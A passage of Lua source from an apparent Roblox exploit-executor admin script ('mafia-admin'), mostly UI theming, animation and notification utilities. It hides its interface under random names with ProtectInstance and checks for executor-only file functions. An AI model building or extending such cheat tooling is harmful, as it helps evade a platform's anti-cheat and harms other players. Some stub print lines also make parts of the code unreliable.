    Connections[#Connections + 1] = Connection
    return Connection
end

local LastCommand = {}

--IMPORT [ui]
Guis = {}
ParentGui = function(Gui, Parent)
    Gui.Name = sub(gsub(GenerateGUID(Services.HttpService, false), '-', ''), 1, random(25, 30))
    ProtectInstance(Gui);
    Gui.Parent = Parent or Services.CoreGui
    Guis[#Guis + 1] = Gui
    return Gui
end
UI = Clone(Services.InsertService:LoadLocalAsset("rbxassetid://7882275026"));
UI.Enabled = true

local CommandBarPrefix;

local ConfigUI = UI.Config
local ConfigElements = ConfigUI.GuiElements
local CommandBar = UI.CommandBar
local Commands = UI.Commands
local ChatLogs = UI.ChatLogs
local Console = UI.Console
local GlobalChatLogs = Clone(UI.ChatLogs);
local HttpLogs = Clone(UI.ChatLogs);
local Notification = UI.Notification
local Command = UI.Command
local ChatLogMessage = UI.Message
local GlobalChatLogMessage = Clone(UI.Message);
local NotificationBar = UI.NotificationBar

CommandBarOpen = false
CommandBarTransparencyClone = Clone(CommandBar);
ChatLogsTransparencyClone = Clone(ChatLogs);
ConsoleTransparencyClone = Clone(Console);
GlobalChatLogsTransparencyClone = Clone(GlobalChatLogs);
HttpLogsTransparencyClone = Clone(HttpLogs);
CommandsTransparencyClone = nil
ConfigUIClone = Clone(ConfigUI);
PredictionText = ""
do
    local UIParent = CommandBar.Parent
    GlobalChatLogs.Parent = UIParent
    GlobalChatLogMessage.Parent = UIParent
    GlobalChatLogs.Name = "GlobalChatLogs"
    GlobalChatLogMessage.Name = "GlobalChatLogMessage"

    HttpLogs.Parent = UIParent
    HttpLogs.Name = "HttpLogs"
    HttpLogs.Size = UDim2.new(0, 421, 0, 260);
    HttpLogs.Search.PlaceholderText = "Search"
end
-- position CommandBar
CommandBar.Position = UDim2.new(0.5, -100, 1, 5);

local UITheme, Values;
do
    local BaseBGColor = Color3.fromRGB(32, 33, 36);
    local BaseTransparency = 0.25
    local BaseTextColor = Color3.fromRGB(220, 224, 234);
    local BaseValues = { BackgroundColor = BaseBGColor, Transparency = BaseTransparency, TextColor = BaseTextColor }
    Values = { Background = clone(BaseValues), CommandBar = clone(BaseValues), CommandList = clone(BaseValues), Notification = clone(BaseValues), ChatLogs = clone(BaseValues), Config = clone(BaseValues) }
    local Objects = keys(Values);
    local GetBaseMT = function(Object)
        return setmetatable({}, {
            __newindex = function(self, Index, Value)
                local type = typeof(Value);
                if (Index == "BackgroundColor") then
                    if (Value == "Reset") then
                        Value = BaseBGColor
                        type = "Color3"
                    end
                    assert(type == 'Color3', format("invalid argument #3 (Color3 expected, got %s)", type));
                    if (Object == "Background") then
                        CommandBar.BackgroundColor3 = Value
                        Notification.BackgroundColor3 = Value
                        Command.BackgroundColor3 = Value
                        ChatLogs.BackgroundColor3 = Value
                        ChatLogs.Frame.BackgroundColor3 = Value
                        Console.BackgroundColor3 = Value
                        Console.Frame.BackgroundColor3 = Value
                        HttpLogs.BackgroundColor3 = Value
                        HttpLogs.Frame.BackgroundColor3 = Value
                        UI.ToolTip.BackgroundColor3 = Value
                        ConfigUI.BackgroundColor3 = Value
                        ConfigUI.Container.BackgroundColor3 = Value
                        Commands.BackgroundColor3 = Value
                        Commands.Frame.BackgroundColor3 = Value
                        local Children = GetChildren(UI.NotificationBar);
                        for i = 1, #Children do
                            local Child = Children[i]
                            if (IsA(Child, "GuiObject")) then
                                Child.BackgroundColor3 = Value
                            end
                        end
                        local Children = GetChildren(Commands.Frame.List);
                        for i = 1, #Children do
                            local Child = Children[i]
                            if (IsA(Child, "GuiObject")) then
                                Child.BackgroundColor3 = Value
                            end
                        end
                        for i, v in next, Values do
                            Values[i].BackgroundColor = Value
                        end
                    elseif (Object == "CommandBar") then
                        CommandBar.BackgroundColor3 = Value
                    elseif (Object == "Notification") then
                        Notification.BackgroundColor3 = Value
                        local Children = GetChildren(UI.NotificationBar);
                        for i = 1, #Children do
                            local Child = Children[i]
                            if (IsA(Child, "GuiObject")) then
                                Child.BackgroundColor3 = Value
                            end
                        end
                    elseif (Object == "CommandList") then
                        Commands.BackgroundColor3 = Value
                        Commands.Frame.BackgroundColor3 = Value
                    elseif (Object == "Command") then
                        Command.BackgroundColor3 = Value
                    elseif (Object == "ChatLogs") then
                        ChatLogs.BackgroundColor3 = Value
                        ChatLogs.Frame.BackgroundColor3 = Value
                        HttpLogs.BackgroundColor3 = Value
                        HttpLogs.Frame.BackgroundColor3 = Value
                    elseif (Object == "Console") then
                        Console.BackgroundColor3 = Value
                        Console.Frame.BackgroundColor3 = Value
                    elseif (Object == "Config") then
                        ConfigUI.BackgroundColor3 = Value
                        ConfigUI.Container.BackgroundColor3 = Value
                    end
                    Values[Object][Index] = Value
                elseif (Index == "TextColor") then
                    if (Value == "Reset") then
                        Value = BaseTextColor
                        type = "Color3"
                    end
                    assert(type == 'Color3', format("invalid argument #3 (Color3 expected, got %s)", type));
                    if (Object == "Notification") then
                        Notification.Title.TextColor3 = Value
                        Notification.Message.TextColor3 = Value
                        Notification.Close.TextColor3 = Value
                    elseif (Object == "CommandBar") then
                        CommandBar.Input.TextColor3 = Value
                        CommandBar.Arrow.TextColor3 = Value
                    elseif (Object == "CommandList") then
                        Command.CommandText.TextColor3 = Value
                        local Descendants = GetDescendants(Commands);
                        for i = 1, #Descendants do
                            local Descendant = Descendants[i]
                            local IsText = IsA(Descendant, "TextBox") or IsA(Descendant, "TextLabel") or IsA(Descendant, "TextButton");
                            if (IsText) then
                                Descendant.TextColor3 = Value
                            end
                        end
                    elseif (Object == "ChatLogs") then
                        UI.Message.TextColor3 = Value
                    elseif (Object == "Config") then
                        local Descendants = GetDescendants(ConfigUI);
                        for i = 1, #Descendants do
                            local Descendant = Descendants[i]
                            local IsText = IsA(Descendant, "TextBox") or IsA(Descendant, "TextLabel") or IsA(Descendant, "TextButton");
                            if (IsText) then
                                Descendant.TextColor3 = Value
                            end
                        end
                    elseif (Object == "Background") then
                        Notification.Title.TextColor3 = Value
                        Notification.Message.TextColor3 = Value
                        Notification.Close.TextColor3 = Value
                        CommandBar.Input.TextColor3 = Value
                        CommandBar.Arrow.TextColor3 = Value
                        Command.CommandText.TextColor3 = Value
                        UI.Message.TextColor3 = Value
                        local Descendants = GetDescendants(ConfigUI);
                        for i = 1, #Descendants do
                            local Descendant = Descendants[i]
                            local IsText = IsA(Descendant, "TextBox") or IsA(Descendant, "TextLabel") or IsA(Descendant, "TextButton");
                            if (IsText) then
                                Descendant.TextColor3 = Value
                            end
                        end
                        local Descendants = GetDescendants(Commands);
                        for i = 1, #Descendants do
                            local Descendant = Descendants[i]
                            local IsText = IsA(Descendant, "TextBox") or IsA(Descendant, "TextLabel") or IsA(Descendant, "TextButton");
                            if (IsText) then
                                Descendant.TextColor3 = Value
                            end
                        end
                        for i, v in next, Values do
                            Values[i].TextColor = Value
                        end
                    end
                    Values[Object][Index] = Value
                elseif (Index == "Transparency") then
                    if (Value == "Reset") then
                        Value = BaseTransparency
                        type = "number"
                    end
                    assert(type == 'number', format("invalid argument #3 (Color3 expected, got %s)", type));
                    if (Object == "Background") then
                        CommandBar.Transparency = Value
                        Notification.Transparency = Value
                        Command.Transparency = Value + .5
                        ChatLogs.Transparency = Value
                        ChatLogs.Frame.Transparency = Value
                        HttpLogs.Transparency = Value
                        HttpLogs.Frame.Transparency = Value
                        UI.ToolTip.Transparency = Value
                        ConfigUI.Transparency = Value
                        ConfigUI.Container.Transparency = Value + .5
                        Commands.Transparency = Value
                        Commands.Frame.Transparency = Value + .5
                        Values[Object][Index] = Value
                    elseif (Object == "Notification") then
                        Notification.Transparency = Value
                        local Children = GetChildren(UI.NotificationBar);
                        for i = 1, #Children do
                            local Child = Children[i]
                            if (IsA(Child, "GuiObject")) then
                                Child.Transparency = Value
                            end
                        end
                    end
                    Values[Object][Index] = Value
                end
            end,
            __index = function(self, Index)
                return Values[Object][Index]
            end
        })
    end
    UITheme = setmetatable({}, {
        __index = function(self, Index)
            if (Tfind(Objects, Index)) then
                local BaseMt = GetBaseMT(Index);
                self[Index] = BaseMt
                return BaseMt
            end
        end
    })
end

local IsSupportedExploit = isfile and isfolder and writefile and readfile

local GetThemeConfig
local WriteThemeConfig = function(Conf)
    if (IsSupportedExploit and isfolder("mafia-admin")) then
        local ToHSV = Color3.new().ToHSV
        local ValuesToEncode = deepsearchset(Values, function(i, v)
            return typeof(v) == 'Color3'
        end, function(i, v)
            local H, S, V = ToHSV(v);
            return {H, S, V, "Color3"}
        end)
        local Data = JSONEncode(Services.HttpService, ValuesToEncode);
        writefile("mafia-admin/Theme.json", Data);
    end
end

GetThemeConfig = function()
    if (IsSupportedExploit and isfolder("mafia-admin")) then
        if (isfile("mafia-admin/Theme.json")) then
            local Success, Data = pcall(JSONDecode, Services.HttpService, readfile("mafia-admin/Theme.json"));
            if (not Success or type(Data) ~= 'table') then
                WriteThemeConfig();
                return Values
            end
            local DecodedData = deepsearchset(Data, function(i, v)
                return type(v) == 'table' and #v == 4 and v[4] == "Color3"
            end, function(i,v)
                return Color3.fromHSV(v[1], v[2], v[3]);
            end)
            return DecodedData            
        else
            WriteThemeConfig();
            return Values
        end
    else
        return Values
    end
end

local LoadTheme;
do
    local Config = GetConfig();
    CommandBarPrefix = isfolder and (Config.CommandBarPrefix and Enum.KeyCode[Config.CommandBarPrefix] or Enum.KeyCode.Semicolon) or Enum.KeyCode.Semicolon

    local Theme = GetThemeConfig();
    LoadTheme = function(Theme)
        UITheme.Background.BackgroundColor = Theme.Background.BackgroundColor
        UITheme.Background.Transparency = Theme.Background.Transparency

        UITheme.ChatLogs.BackgroundColor = Theme.ChatLogs.BackgroundColor
        UITheme.CommandBar.BackgroundColor = Theme.CommandBar.BackgroundColor
        UITheme.Config.BackgroundColor = Theme.Config.BackgroundColor
        UITheme.Notification.BackgroundColor = Theme.Notification.BackgroundColor
        UITheme.CommandList.BackgroundColor = Theme.Notification.BackgroundColor
        
        UITheme.ChatLogs.TextColor = Theme.ChatLogs.TextColor
        UITheme.CommandBar.TextColor = Theme.CommandBar.TextColor
        UITheme.Config.TextColor = Theme.Config.TextColor
        UITheme.Notification.TextColor = Theme.Notification.TextColor
        UITheme.CommandList.TextColor = Theme.Notification.TextColor

        UITheme.ChatLogs.Transparency = Theme.ChatLogs.Transparency
        UITheme.CommandBar.Transparency = Theme.CommandBar.Transparency
        UITheme.Config.Transparency = Theme.Config.Transparency
        UITheme.Notification.Transparency = Theme.Notification.Transparency
        UITheme.CommandList.Transparency = Theme.Notification.Transparency
    end
    LoadTheme(Theme);
end
--END IMPORT [ui]



--IMPORT [utils]
Utils.Tween = function(Object, Style, Direction, Time, Goal)
    local TweenService = Services.TweenService
    local TInfo = TweenInfo.new(Time, Enum.EasingStyle[Style], Enum.EasingDirection[Direction])
    local Tween = TweenService.Create(TweenService, Object, TInfo, Goal)

    Tween.Play(Tween)

    return Tween
end

Utils.MultColor3 = function(Color, Delta)
    local clamp = math.clamp
    return Color3.new(clamp(Color.R * Delta, 0, 1), clamp(Color.G * Delta, 0, 1), clamp(Color.B * Delta, 0, 1));
end

Utils.Click = function(Object, Goal) -- Utils.Click(Object, "BackgroundColor3")
    local Hover = {
        [Goal] = Utils.MultColor3(Object[Goal], 0.9)
    }

    local Press = {
        [Goal] = Utils.MultColor3(Object[Goal], 1.2)
    }

    local Origin = {
        [Goal] = Object[Goal]
    }

    AddConnection(CConnect(Object.MouseEnter, function()
        Utils.Tween(Object, "Sine", "Out", .5, Hover);
    end));

    AddConnection(CConnect(Object.MouseLeave, function()
        Utils.Tween(Object, "Sine", "Out", .5, Origin);
    end));

    AddConnection(CConnect(Object.MouseButton1Down, function()
        Utils.Tween(Object, "Sine", "Out", .3, Press);
    end));

    AddConnection(CConnect(Object.MouseButton1Up, function()
        Utils.Tween(Object, "Sine", "Out", .4, Hover);
    end));
end

Utils.Blink = function(Object, Goal, Color1, Color2) -- Utils.Click(Object, "BackgroundColor3", NormalColor, OtherColor)
    local Normal = {
        [Goal] = Color1
    }

    local Blink = {
        [Goal] = Color2
    }

    local Tween = Utils.Tween(Object, "Sine", "Out", .5, Blink)
    CWait(Tween.Completed);

    Tween = Utils.Tween(Object, "Sine", "Out", .5, Normal)
    CWait(Tween.Completed);
end

Utils.Hover = function(Object, Goal)
    local Hover = {
        [Goal] = Utils.MultColor3(Object[Goal], 0.9)
    }

    local Origin = {
        [Goal] = Object[Goal]
    }

    AddConnection(CConnect(Object.MouseEnter, function()
        Utils.Tween(Object, "Sine", "Out", .5, Hover);
    end));

    AddConnection(CConnect(Object.MouseLeave, function()
        Utils.Tween(Object, "Sine", "Out", .5, Origin);
    end));
end

Utils.Draggable = function(Ui, DragUi)
    local DragSpeed = 0
    local StartPos
    local DragToggle, DragInput, DragStart, DragPos

    DragUi = Dragui or Ui
    local TweenService = Services.TweenService

    local function UpdateInput(Input)
        local Delta = Input.Position - DragStart
        local Position = UDim2.new(StartPos.X.Scale, StartPos.X.Offset + Delta.X, StartPos.Y.Scale, StartPos.Y.Offset + Delta.Y)

        Utils.Tween(Ui, "Linear", "Out", .25, {
            Position = Position
        });
        local Tween = TweenService.Create(TweenService, Ui, TweenInfo.new(0.25), {Position = Position});
        Tween.Play(Tween);
    end

    AddConnection(CConnect(Ui.InputBegan, function(Input)
        if ((Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch) and Services.UserInputService.GetFocusedTextBox(Services.UserInputService) == nil) then
            DragToggle = true
            DragStart = Input.Position
            StartPos = Ui.Position

            AddConnection(CConnect(Input.Changed, function()
                if (Input.UserInputState == Enum.UserInputState.End) then
                    DragToggle = false
                end
            end));
        end
    end));

    AddConnection(CConnect(Ui.InputChanged, function(Input)
        if (Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch) then
            DragInput = Input
        end
    end));

    AddConnection(CConnect(Services.UserInputService.InputChanged, function(Input)
        if (Input == DragInput and DragToggle) then
            UpdateInput(Input)
        end
    end));
end

Utils.SmoothScroll = function(content, SmoothingFactor) -- by Elttob
    -- get the 'content' scrolling frame, aka the scrolling frame with all the content inside
    -- if smoothing is enabled, disable scrolling
    content.ScrollingEnabled = false

    -- create the 'input' scrolling frame, aka the scrolling frame which receives user input
    -- if smoothing is enabled, enable scrolling
    local input = Clone(content)

    input.ClearAllChildren(input);
    input.BackgroundTransparency = 1
    input.ScrollBarImageTransparency = 1
    input.ZIndex = content.ZIndex + 1
    input.Name = "_smoothinputframe"
    input.ScrollingEnabled = true
    input.Parent = content.Parent

    -- keep input frame in sync with content frame
    local function syncProperty(prop)
        AddConnection(CConnect(GetPropertyChangedSignal(content, prop), function()
            if prop == "ZIndex" then
                -- keep the input frame on top!
                input[prop] = content[prop] + 1
            else
                input[prop] = content[prop]
            end
        end));
    end

    syncProperty "CanvasSize"
    syncProperty "Position"
    syncProperty "Rotation"
    syncProperty "ScrollingDirection"
    syncProperty "ScrollBarThickness"
    syncProperty "BorderSizePixel"
    syncProperty "ElasticBehavior"
    syncProperty "SizeConstraint"
    syncProperty "ZIndex"
    syncProperty "BorderColor3"
    syncProperty "Size"
    syncProperty "AnchorPoint"
    syncProperty "Visible"

    -- create a render stepped connection to interpolate the content frame position to the input frame position
    local smoothConnection = AddConnection(CConnect(RenderStepped, function()
        local a = content.CanvasPosition
        local b = input.CanvasPosition
        local c = SmoothingFactor
        local d = (b - a) * c + a

        content.CanvasPosition = d
    end));

    AddConnection(CConnect(content.AncestryChanged, function()
        if content.Parent == nil then
            Destroy(input);
            Disconnect(smoothConnection);
        end
    end));
end

Utils.TweenAllTransToObject = function(Object, Time, BeforeObject) -- max transparency is max object transparency, swutched args bc easier command
    local Descendants = GetDescendants(Object);
    local OldDescentants = GetDescendants(BeforeObject);
    local Tween -- to use to wait

    Tween = Utils.Tween(Object, "Sine", "Out", Time, {
        BackgroundTransparency = BeforeObject.BackgroundTransparency
    })

    for i = 1, #Descendants do
        local v = Descendants[i]
        local IsText = IsA(v, "TextBox") or IsA(v, "TextLabel") or IsA(v, "TextButton")
        local IsImage = IsA(v, "ImageLabel") or IsA(v, "ImageButton")
        local IsScrollingFrame = IsA(v, "ScrollingFrame")

        if (IsA(v, "GuiObject")) then
            if (IsText) then
                Utils.Tween(v, "Sine", "Out", Time, {
                    TextTransparency = OldDescentants[i].TextTransparency,
                    TextStrokeTransparency = OldDescentants[i].TextStrokeTransparency,
                    BackgroundTransparency = OldDescentants[i].BackgroundTransparency
                })
            elseif (IsImage) then
                Utils.Tween(v, "Sine", "Out", Time, {
                    ImageTransparency = OldDescentants[i].ImageTransparency,
                    BackgroundTransparency = OldDescentants[i].BackgroundTransparency
                })
            elseif (IsScrollingFrame) then
                Utils.Tween(v, "Sine", "Out", Time, {
                    ScrollBarImageTransparency = OldDescentants[i].ScrollBarImageTransparency,
                    BackgroundTransparency = OldDescentants[i].BackgroundTransparency
                })
            else
                Utils.Tween(v, "Sine", "Out", Time, {
                    BackgroundTransparency = OldDescentants[i].BackgroundTransparency
                })
            end
        end
    end

    return Tween
end

Utils.SetAllTrans = function(Object)
    Object.BackgroundTransparency = 1

    local Descendants = GetDescendants(Object);
    for i = 1, #Descendants do
        local v = Descendants[i]
        local IsText = IsA(v, "TextBox") or IsA(v, "TextLabel") or IsA(v, "TextButton")
        local IsImage = IsA(v, "ImageLabel") or IsA(v, "ImageButton")
        local IsScrollingFrame = IsA(v, "ScrollingFrame")

        if (IsA(v, "GuiObject")) then
            v.BackgroundTransparency = 1

            if (IsText) then
                v.TextTransparency = 1
            elseif (IsImage) then
                v.ImageTransparency = 1
            elseif (IsScrollingFrame) then
                v.ScrollBarImageTransparency = 1
            end
        end
    end
end

Utils.TweenAllTrans = function(Object, Time)
    local Tween -- to use to wait

    Tween = Utils.Tween(Object, "Sine", "Out", Time, {
        BackgroundTransparency = 1
    })

    local Descendants = GetDescendants(Object);
    for i = 1, #Descendants do
        local v = Descendants[i]
        local IsText = IsA(v, "TextBox") or IsA(v, "TextLabel") or IsA(v, "TextButton")
        local IsImage = IsA(v, "ImageLabel") or IsA(v, "ImageButton")
        local IsScrollingFrame = IsA(v, "ScrollingFrame")

        if (IsA(v, "GuiObject")) then
            if (IsText) then
                Utils.Tween(v, "Sine", "Out", Time, {
                    TextTransparency = 1,
                    BackgroundTransparency = 1
                })
            elseif (IsImage) then
                Utils.Tween(v, "Sine", "Out", Time, {
                    ImageTransparency = 1,
                    BackgroundTransparency = 1
                })
            elseif (IsScrollingFrame) then
                Utils.Tween(v, "Sine", "Out", Time, {
                    ScrollBarImageTransparency = 1,
                    BackgroundTransparency = 1
                })
            else
                Utils.Tween(v, "Sine", "Out", Time, {
                    BackgroundTransparency = 1
                })
            end
        end
    end

    return Tween
end

Utils.TextSize = function(Object)
    local TextService = Services.TextService
    return TextService.GetTextSize(TextService, Object.Text, Object.TextSize, Object.Font, Vector2.new(Object.AbsoluteSize.X, 1000)).Y
end

Utils.Notify = function(Caller, Title, Message, Time)
    if (not Caller or Caller == LocalPlayer) then
        local Notification = UI.Notification
        local NotificationBar = UI.NotificationBar

        local Clone = Clone(Notification)

        local function TweenDestroy()
            if (Utils and Clone) then
                local Tween = Utils.TweenAllTrans(Clone, .25)

                CWait(Tween.Completed)
                Destroy(Clone);
            end
        end

        Clone.Message.Text = Message
        Clone.Title.Text = Title or "Notification"
        Utils.SetAllTrans(Clone)
        Utils.Click(Clone.Close, "TextColor3")
        Clone.Visible = true
	    Clone.Size = UDim2.fromOffset(Clone.Size.X.Offset, Utils.TextSize(Clone.Message) + Clone.Size.Y.Offset - Clone.Message.TextSize);
        Clone.Parent = NotificationBar

        coroutine.wrap(function()
            local Tween = Utils.TweenAllTransToObject(Clone, .5, Notification)

            CWait(Tween.Completed);
            wait(Time or 5);

            if (Clone) then
                TweenDestroy();
            end
        end)()

        AddConnection(CConnect(Clone.Close.MouseButton1Click, TweenDestroy));
        if (Title ~= "Warning" and Title ~= "Error") then
print("warning")
        end

        return Clone
    else
print("whitelisted a user")
    end
end

Utils.MatchSearch = function(String1, String2)
    return String1 == sub(String2, 1, #String1);
end

Utils.StringFind = function(Table, String)
    for _, v in ipairs(Table) do
        if (Utils.MatchSearch(String, v)) then
            return v
        end
    end
end

Utils.GetPlayerArgs = function(Arg)
    Arg = lower(Arg);
    local SpecialCases = {"all", "others", "random", "me", "nearest", "farthest", "npcs", "allies", "enemies"}
    if (Utils.StringFind(SpecialCases, Arg)) then
        return Utils.StringFind(SpecialCases, Arg);
    end

    local CurrentPlayers = GetPlayers(Players);
    for i, v in next, CurrentPlayers do
        local Name, DisplayName = v.Name, v.DisplayName
        if (Name ~= DisplayName and Utils.MatchSearch(Arg, lower(DisplayName))) then
            return lower(DisplayName);
        end
        if (Utils.MatchSearch(Arg, lower(Name))) then
            return lower(Name);
        end
    end
end

Utils.ToolTip = function(Object, Message)
    local CloneToolTip
    local TextService = Services.TextService

    AddConnection(CConnect(Object.MouseEnter, function()
        if (Object.BackgroundTransparency < 1 and not CloneToolTip) then
            local TextSize = TextService.GetTextSize(TextService, Message, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24

            CloneToolTip = Clone(UI.ToolTip)
            CloneToolTip.Text = Message
            CloneToolTip.TextScaled = TextSize
            CloneToolTip.Visible = true
            CloneToolTip.Parent = UI
        end
    end))

    AddConnection(CConnect(Object.MouseLeave, function()
        if (CloneToolTip) then
            Destroy(CloneToolTip);
            CloneToolTip = nil
        end
    end))

    if (LocalPlayer) then
        AddConnection(CConnect(Mouse.Move, function()
            if (CloneToolTip) then
                CloneToolTip.Position = UDim2.fromOffset(Mouse.X + 10, Mouse.Y + 10)
            end
        end))
    else
        delay(3, function()
            LocalPlayer = Players.LocalPlayer
            AddConnection(CConnect(Mouse.Move, function()
                if (CloneToolTip) then
                    CloneToolTip.Position = UDim2.fromOffset(Mouse.X + 10, Mouse.Y + 10)
                end
            end))
        end)
    end
end

Utils.ClearAllObjects = function(Object)
    local Children = GetChildren(Object);
    for i = 1, #Children do
        local Child = Children[i]
        if (IsA(Child, "GuiObject")) then
            Destroy(Child);
        end
    end
end

Utils.Rainbow = function(TextObject)
    local Text = TextObject.Text
    local Frequency = 1 -- determines how quickly it repeats
    local TotalCharacters = 0
    local Strings = {}

    TextObject.RichText = true

    for Character in gmatch(Text, ".") do
        if match(Character, "%s") then
            Strings[#Strings + 1] = Character
        else
            TotalCharacters = TotalCharacters + 1
            Strings[#Strings + 1] = {'<font color="rgb(%i, %i, %i)">' .. Character .. '</font>'}
        end
    end

    local Connection = AddConnection(CConnect(Heartbeat, function()
        local String = ""
        local Counter = TotalCharacters

        for _, CharacterTable in ipairs(Strings) do
            local Concat = ""

            if (type(CharacterTable) == "table") then
                Counter = Counter - 1
                local Color = Color3.fromHSV(-atan(math.tan((tick() + Counter/math.pi)/Frequency))/math.pi + 0.5, 1, 1)

                CharacterTable = format(CharacterTable[1], floor(Color.R * 255), floor(Color.G * 255), floor(Color.B * 255))
            end

            String = String .. CharacterTable
        end

        TextObject.Text = String .. " "
    end));
    delay(150, function()
        Disconnect(Connection);
    end)

end

Utils.Vector3toVector2 = function(Vector)
    local Tuple = WorldToViewportPoint(Camera, Vector);
    return Vector2New(Tuple.X, Tuple.Y);
end

Utils.AddTag = function(Tag)
    if (not Tag) then
        return
    end
    local PlrCharacter = GetCharacter(Tag.Player)
    if (not PlrCharacter) then
        return
    end
    local Billboard = InstanceNew("BillboardGui");
    Billboard.Parent = UI
    Billboard.Name = GenerateGUID(Services.HttpService);
    Billboard.AlwaysOnTop = true
    Billboard.Adornee = FindFirstChild(PlrCharacter, "Head") or nil
    Billboard.Enabled = FindFirstChild(PlrCharacter, "Head") and true or false
    Billboard.Size = UDim2.new(0, 200, 0, 50)
    Billboard.StudsOffset = Vector3New(0, 4, 0);

    local TextLabel = InstanceNew("TextLabel", Billboard);
    TextLabel.Name = GenerateGUID(Services.HttpService);
    TextLabel.TextStrokeTransparency = 0.6
    TextLabel.BackgroundTransparency = 1
    TextLabel.TextColor3 = Color3.new(0, 255, 0);
    TextLabel.Size = UDim2.new(0, 200, 0, 50);
    TextLabel.TextScaled = false
    TextLabel.TextSize = 15
    TextLabel.Text = format("%s (%s)", Tag.Name, Tag.Tag);

    if (Tag.Rainbow) then
        Utils.Rainbow(TextLabel)
    end
    if (Tag.Colour) then
        local TColour = Tag.Colour
        TextLabel.TextColor3 = Color3.fromRGB(TColour[1], TColour[2], TColour[3]);
    end

    local Added = AddConnection(CConnect(Tag.Player.CharacterAdded, function()
        Billboard.Adornee = WaitForChild(Tag.Player.Character, "Head");
    end));

    AddConnection(CConnect(Players.PlayerRemoving, function(plr)
        if (plr == Tag.Player) then
            Disconnect(Added);
            Destroy(Billboard);
        end
    end))
end

Utils.TextFont = function(Text, RGB)
    RGB = concat(RGB, ",")
    local New = {}
    gsub(Text, ".", function(x)
        New[#New + 1] = x
    end)
    return concat(map(New, function(i, letter)
        return format('<font color="rgb(%s)">%s</font>', RGB, letter)
    end)) .. " "
end

Utils.Thing = function(Object)
    local Container = InstanceNew("Frame");
    local Hitbox = InstanceNew("ImageButton");
    local UDim2fromOffset = UDim2.fromOffset

    Container.Name = "Container"
    Container.Parent = Object.Parent
    Container.BackgroundTransparency = 1.000
    Container.BorderSizePixel = 0
    Container.Position = Object.Position
    Container.ClipsDescendants = true
    Container.Size = UDim2fromOffset(Object.AbsoluteSize.X, Object.AbsoluteSize.Y);
    Container.ZIndex = Object
    
    Object.AutomaticSize = Enum.AutomaticSize.X
    Object.Size = UDim2.fromScale(1, 1)
    Object.Position = UDim2.fromScale(0, 0)
    Object.Parent = Container
    Object.TextTruncate = Enum.TextTruncate.None
    Object.ZIndex = Object.ZIndex + 2
    
    Hitbox.Name = "Hitbox"
    Hitbox.Parent = Container.Parent
    Hitbox.BackgroundTransparency = 1.000
    Hitbox.Size = Container.Size
    Hitbox.Position = Container.Position
    Hitbox.ZIndex = Object.ZIndex + 2
    
    local MouseOut = true
    
    AddConnection(CConnect(Hitbox.MouseEnter, function()
        if Object.AbsoluteSize.X > Container.AbsoluteSize.X then
            MouseOut = false
            repeat
                local Tween1 = Utils.Tween(Object, "Quad", "Out", .5, {
                    Position = UDim2fromOffset(Container.AbsoluteSize.X - Object.AbsoluteSize.X, 0);
                })
                CWait(Tween1.Completed);
                wait(.5);
                local Tween2 = Utils.Tween(Object, "Quad", "Out", .5, {
                    Position = UDim2fromOffset(0, 0);
                })
                CWait(Tween2.Completed);
                wait(.5);
            until MouseOut
        end
    end))

    AddConnection(CConnect(Hitbox.MouseLeave, function()
        MouseOut = true
        Utils.Tween(Object, "Quad", "Out", .25, {
            Position = UDim2fromOffset(0, 0);
        });
    end))
    
    return Object
end

function Utils.Intro(Object)
	local Frame = InstanceNew("Frame");
	local UICorner = InstanceNew("UICorner");
	local CornerRadius = FindFirstChild(Object, "UICorner") and Object.UICorner.CornerRadius or UDim.new(0, 0)
    local UDim2fromOffset  = UDim2.fromOffset

	Frame.Name = "IntroFrame"
	Frame.ZIndex = 1000
	Frame.Size = UDim2fromOffset(Object.AbsoluteSize.X, Object.AbsoluteSize.Y)
	Frame.AnchorPoint = Vector2.new(.5, .5)
	Frame.Position = UDim2.new(Object.Position.X.Scale, Object.Position.X.Offset + (Object.AbsoluteSize.X / 2), Object.Position.Y.Scale, Object.Position.Y.Offset + (Object.AbsoluteSize.Y / 2))
	Frame.BackgroundColor3 = Object.BackgroundColor3
	Frame.BorderSizePixel = 0

	UICorner.CornerRadius = CornerRadius
	UICorner.Parent = Frame

	Frame.Parent = Object.Parent

	if (Object.Visible) then
		Frame.BackgroundTransparency = 1

		local Tween = Utils.Tween(Frame, "Quad", "Out", .25, {
			BackgroundTransparency = 0
		});

		CWait(Tween.Completed);
		Object.Visible = false

		local Tween = Utils.Tween(Frame, "Quad", "Out", .25, {
			Size = UDim2fromOffset(0, 0);
		});

		Utils.Tween(UICorner, "Quad", "Out", .25, {
			CornerRadius = UDim.new(1, 0)
		});

		CWait(Tween.Completed);
		Destroy(Frame);
	else
		Frame.Visible = true
		Frame.Size = UDim2fromOffset(0, 0)
		UICorner.CornerRadius = UDim.new(1, 0)

		local Tween = Utils.Tween(Frame, "Quad", "Out", .25, {
			Size = UDim2fromOffset(Object.AbsoluteSize.X, Object.AbsoluteSize.Y)
		});

		Utils.Tween(UICorner, "Quad", "Out", .25, {
			CornerRadius = CornerRadius
		});

		CWait(Tween.Completed);
		Object.Visible = true

		local Tween = Utils.Tween(Frame, "Quad", "Out", .25, {
			BackgroundTransparency = 1
		})

		CWait(Tween.Completed);
		Destroy(Frame);
	end
end

Utils.MakeGradient = function(ColorTable)
	local Table = {}
    local ColorSequenceKeypointNew = ColorSequenceKeypoint.new
	for Time, Color in next, ColorTable do
		Table[#Table + 1] = ColorSequenceKeypointNew(Time - 1, Color);
	end
	return ColorSequence.new(Table)
end

Utils.Debounce = function(Func)
	local Debounce = false

	return function(...)
		if (not Debounce) then
			Debounce = true
			Func(...);
			Debounce = false
		end
	end
end

Utils.ToggleFunction = function(Container, Enabled, Callback) -- fpr color picker
    local Switch = Container.Switch
    local Hitbox = Container.Hitbox
    local Color3fromRGB = Color3.fromRGB
    local UDim2fromOffset = UDim2.fromOffset

    Container.BackgroundColor3 = Color3fromRGB(255, 79, 87);

    if not Enabled then
        Switch.Position = UDim2fromOffset(2, 2)
        Container.BackgroundColor3 = Color3fromRGB(25, 25, 25);
    end

    AddConnection(CConnect(Hitbox.MouseButton1Click, function()
        Enabled = not Enabled
        
        Utils.Tween(Switch, "Quad", "Out", .25, {
            Position = Enabled and UDim2.new(1, -18, 0, 2) or UDim2fromOffset(2, 2)
        });
        Utils.Tween(Container, "Quad", "Out", .25, {
